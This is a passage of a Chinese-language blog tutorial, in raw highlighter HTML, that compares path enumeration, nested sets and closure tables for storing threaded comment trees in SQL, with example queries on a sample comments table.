class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd09f3530c526116246-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd09f3530c526116246-1\"><span class=\"crayon-e \">SELECT *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">comemnts </span><span class=\"crayon-st\">AS</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">WHERE</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">path </span><span class=\"crayon-i\">LIKE</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'1/4'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'%'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这句查询语句所有能找到的后台路径分别是：1/4/5、1/4/5/6、1/4/5/7。</p>\n<p>一旦你可以很简单地获取一棵子树或者从子孙节点到祖先节点的路径，你就可以很简单地实现更多的查询，如查询一颗子树所有节点上值的总和。</p>\n<p>插入一个节点也可以像使用邻接表一样地简单。你所需要做的只是复制一份要插入节点的父亲节点路径，并将这个新节点的ID追加到路径末尾即可。</p>\n<p>路径枚举也存在一些缺点，比如数据库不能确保路径的格式总是正确或者路径中的节点确实存在。依赖于应用程序的逻辑代码来维护路径的字符串，并且验证字符串的正确性开销很大。无论将varchar 的长度设定为多大，依旧存在长度的限制，因而并不能够支持树结构无限扩展。</p>\n<h3>二、 嵌套集</h3>\n<p>嵌套集解决方案是存储子孙节点的相关信息，而不是节点的直接祖先。我们使用两个数字来编码每个节点，从而表示这一信息，可以将这两个数字称为nsleft 和 nsright。</p>\n<p>每个节点通过如下的方式确定nsleft 和nsright 的值：nsleft的数值小于该节点所有后代ID，同时nsright 的值大于该节点的所有后代的ID。这些数字和comment_id 的值并没有任何关联。</p>\n<p>确定这三个值（nsleft，comment_id，nsright）的简单方法是对树进行一次深度优先遍历，在逐层深入的过程中依次递增地分配nsleft的值，并在返回时依次递增地分配nsright的值。得到数据如下:</p>\n<p><img src=\"http://img.blog.csdn.net/20170606203931626\" alt=\"\"></p>\n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\">\n<colgroup>\n<col>\n<col>\n<col>\n<col>\n<col></colgroup>\n<tbody>\n<tr>\n<td>comment_id</td>\n<td>nsleft</td>\n<td>nsright</td>\n<td>author</td>\n<td>comment</td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>14</td>\n<td>小明</td>\n<td>我不大认同这个观点</td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>5</td>\n<td>小张</td>\n<td>我也不认同</td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>4</td>\n<td>小红</td>\n<td>我同意楼上</td>\n</tr>\n<tr>\n<td>4</td>\n<td>6</td>\n<td>13</td>\n<td>小全</td>\n<td>你为什么不认同呢</td>\n</tr>\n<tr>\n<td>5</td>\n<td>7</td>\n<td>12</td>\n<td>小明</td>\n<td>我以前遇到过这情况</td>\n</tr>\n<tr>\n<td>6</td>\n<td>8</td>\n<td>9</td>\n<td>小张</td>\n<td>那也不代表你所说是对的</td>\n</tr>\n<tr>\n<td>7</td>\n<td>10</td>\n<td>11</td>\n<td>小新</td>\n<td>这个视情况而定吧</td>\n</tr>\n</tbody>\n</table>\n<p>一旦你为每个节点分配了这些数字，就可以使用它们来找到指定节点的祖先和后代。比如搜索评论#4及其所有后代，可以通过搜索哪些节点的ID在评论 #4 的nsleft 和 nsright 范围之间，例：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd09f35317788521505\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT c2.* FROM comments AS c1 JOIN comments AS c2 ON c2.nsleft BETWEEN c1.nsleft\r\nAND c1.nsright WHERE c1.comment_id = 4;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd09f35317788521505-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd09f35317788521505-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd09f35317788521505-1\"><span class=\"crayon-e\">SELECT </span><span class=\"crayon-v\">c2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">comments </span><span class=\"crayon-st\">AS</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">c1 </span><span class=\"crayon-e\">JOIN </span><span class=\"crayon-e\">comments </span><span class=\"crayon-st\">AS</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">c2 </span><span class=\"crayon-e\">ON </span><span class=\"crayon-v\">c2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsleft </span><span class=\"crayon-e\">BETWEEN </span><span class=\"crayon-v\">c1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsleft</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd09f35317788521505-2\"><span class=\"crayon-st\">AND</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsright </span><span class=\"crayon-e\">WHERE </span><span class=\"crayon-v\">c1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">comment_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>比如搜索评论#6及其所有祖先，可以通过搜索#6的ID在哪些节点的nsleft 和 nsright 范围之间，例：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd09f35323952175143\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT c2.* FROM comments AS c1 JOIN comments AS c2 ON c1.nsleft BETWEEN c2.nsleft\r\nAND c2.nsright WHERE c1.comment_id = 6;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd09f35323952175143-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd09f35323952175143-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd09f35323952175143-1\"><span class=\"crayon-e\">SELECT </span><span class=\"crayon-v\">c2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">comments </span><span class=\"crayon-st\">AS</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">c1 </span><span class=\"crayon-e\">JOIN </span><span class=\"crayon-e\">comments </span><span class=\"crayon-st\">AS</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">c2 </span><span class=\"crayon-e\">ON </span><span class=\"crayon-v\">c1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsleft </span><span class=\"crayon-e\">BETWEEN </span><span class=\"crayon-v\">c2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsleft</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd09f35323952175143-2\"><span class=\"crayon-st\">AND</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsright </span><span class=\"crayon-e\">WHERE </span><span class=\"crayon-v\">c1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">comment_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>使用嵌套集设计的主要优势是，当你想要删除一个非叶子节点时，它的后代会自动替代被删除的节点，成为其直接祖先节点的直接后代。就是说已经自动减少了一层。</p>\n<p>然而，某些在邻接表的设计中表现得很简单的查询，比如获取一个节点的直接父亲或者直接后代，在嵌套集设计中会变得比较复杂。在嵌套集中，如果需要查询一个节点的直接父亲，我们会这么做，比如要找到评论#6 的直接父亲：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd09f3532c365909694\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT parent.* FROM comments AS c JOIN comments AS parent ON c.nsleft BETWEEN parent.nsleft AND parent.nsright\r\nLEFT OUTER JOIN comments AS in_between ON c.nsleft BETWEEN in_between.nsleft AND in_between.nsright\r\nAND in_between.nsleft BETWEEN parent.nsleft AND parent.nsright WHERE c.comment_id = 6\r\nAND in_between.comment_id IS NULL;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd09f3532c365909694-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd09f3532c365909694-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd09f3532c365909694-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd09f3532c365909694-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd09f3532c365909694-1\"><span class=\"crayon-e\">SELECT </span><span class=\"crayon-r\">parent</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">comments </span><span class=\"crayon-st\">AS</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JOIN </span><span class=\"crayon-e\">comments </span><span class=\"crayon-st\">AS</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">parent</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ON</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsleft </span><span class=\"crayon-e\">BETWEEN </span><span class=\"crayon-r\">parent</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsleft </span><span class=\"crayon-st\">AND</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">parent</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsright</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd09f3532c365909694-2\"><span class=\"crayon-e\">LEFT </span><span class=\"crayon-e\">OUTER </span><span class=\"crayon-e\">JOIN </span><span class=\"crayon-e\">comments </span><span class=\"crayon-st\">AS</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">in_between </span><span class=\"crayon-i\">ON</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsleft </span><span class=\"crayon-e\">BETWEEN </span><span class=\"crayon-v\">in_between</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsleft </span><span class=\"crayon-st\">AND</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">in_between</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsright</span></div><div class=\"crayon-line\" id=\"crayon-594bd09f3532c365909694-3\"><span class=\"crayon-st\">AND</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">in_between</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsleft </span><span class=\"crayon-e\">BETWEEN </span><span class=\"crayon-r\">parent</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsleft </span><span class=\"crayon-st\">AND</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">parent</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nsright </span><span class=\"crayon-i\">WHERE</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">comment_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd09f3532c365909694-4\"><span class=\"crayon-st\">AND</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">in_between</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">comment_id </span><span class=\"crayon-st\">IS</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>总之有些复杂。</p>\n<p>对树进行操作，比如插入和移动节点，使用嵌套集会比其它设计复杂很多。当插入一个新节点时，你需要重新计算新插入节点的相邻兄弟节点、祖先节点和它祖先节点的兄弟，来确保他们的左右值都比这个新节点的左值大。同时，如果这个新节点时一个非叶子节点，你还要检查它的子孙节点。</p>\n<p>如果简单快速查询是整个程序中最重要的部分，嵌套集是最好的选择，比操作单独的节点要方便快捷很多。然而，嵌套集的插入和移动节点是比较复杂的，因为需要重新分配左右值，如果你的应用程序需要频繁的插入、删除节点，那么嵌套集可能并不合适。</p>\n<h3>三、闭包表</h3>\n<p>闭包表是解决分级存储的一个简单而优雅的解决方案，它记录了树中所有节点间的关系，而不仅仅只有那些直接的父子节点。</p>\n<p>在设计评论系统时，我们额外创建了一个叫 tree_paths 表，它包含两列，每一列都指向 comments 中的外键。</p>\n<p>我们不再使用comments 表存储树的结构，而是将树中任何具有（祖先 一 后代）关系的节点对都存储在treepaths 表里，即使这两个节点之间不是直接的父子关系；同时，我们还增加一行指向节点自己。</p>\n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\">\n<colgroup>\n<col>\n<col>\n<col>\n<col>\n<col>\n<col>\n<col>\n<col></colgroup>\n<tbody>\n<tr>\n<td>祖先</td>\n<td>后代</td>\n<td>祖先</td>\n<td>后代</td>\n<td>祖先</td>\n<td>后代</td>\n<td>祖先</td>\n<td>后代</td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>7</td>\n<td>4</td>\n<td>6</td>\n<td>7</td>\n<td>7</td>\n</tr>\n<tr>\n<td>1</td>\n<td>2</td>\n<td>2</td>\n<td>2</td>\n<td>4</td>\n<td>7</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>3</td>\n<td>2</td>\n<td>3</td>\n<td>5</td>\n<td>5</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>4</td>\n<td>3</td>\n<td>3</td>\n<td>5</td>\n<td>6</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>5</td>\n<td>4</td>\n<td>4</td>\n<td>5</td>\n<td>7</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>6</td>\n<td>4</td>\n<td>5</td>\n<td>6</td>\n<td>6</td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>通过treepaths 表来获取祖先和后代比使用嵌套集更加的直接。例如要获取评论#4的后代，只需要在 treepaths 表中搜索祖先是评论 #4的行就行了。同样获取后代也是如此。</p>\n<p>要插入一个新的叶子节点，比如评论#6的一个子节点，应首先插入一条自己到自己的关系，然后搜索 treepaths 表中后代是评论#6 的节点，增加该节点和新插入节点的“祖先一后代”关系（新节点ID 应该为8）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd09f35336967600355\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nINSERT INTO treepaths (ancestor, descendant)\r\nSELECT t.ancestor, 8\r\nFROM treepaths AS t\r\nWHERE t.descendant = 6\r\nUNION ALL SELECT 8, 8;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd09f35336967600355-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd09f35336967600355-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd09f35336967600355-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd09f35336967600355-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd09f35336967600355-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd09f35336967600355-1\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">treepaths</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ancestor</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">descendant</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd09f35336967600355-2\"><span class=\"crayon-i\">SELECT</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ancestor</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span></div><div class=\"crayon-line\" id=\"crayon-594bd09f35336967600355-3\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">treepaths </span><span class=\"crayon-st\">AS</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd09f35336967600355-4\"><span class=\"crayon-i\">WHERE</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">descendant</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span></div><div class=\"crayon-line\" id=\"crayon-594bd09f35336967600355-5\"><span class=\"crayon-e\">UNION </span><span class=\"crayon-e\">ALL </span><span class=\"crayon-i\">SELECT</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>要删除一个叶子节点，比如评论#7， 应删除所有treepaths 表中后代为评论 #7 的行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd09f35343134737126\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nDELETE FROM treepaths WHERE descendant = 7;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd09f35343134737126-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd09f35343134737126-1\"><span class=\"crayon-e\">DELETE </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">treepaths </span><span class=\"crayon-e\">WHERE </span><span 